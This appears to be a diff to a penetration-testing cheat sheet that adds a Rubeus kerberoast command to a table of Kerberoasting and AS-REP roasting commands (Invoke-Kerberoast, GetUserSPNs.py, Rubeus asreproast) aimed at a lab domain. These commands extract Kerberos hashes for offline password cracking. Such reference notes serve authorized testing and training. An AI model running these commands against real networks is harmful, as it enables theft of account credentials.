@@ -1,6 +1,7 @@
 | `Command` | `Description` |
 | --------------|-------------------|
 | `Invoke-Kerberoast`  | Get Kerberoastable accounts & hashes on Windows  |
+| `Rubeus.exe kerberoast /nowrap`  | Get Kerberoastable accounts & hashes on Windows  |
 | `GetUserSPNs.py inlanefreight.local/pixis`  | Get Kerberoastable accounts & hashes on Linux |
 | `Get-DomainUser -UACFilter DONT_REQ_PREAUTH`  | Get AS-Rep roastable accounts & hashes on Windows |
 | `Rubeus.exe asreproast /format:hashcat` | Get AS-Rep roastable accounts & hashes with rubeus |
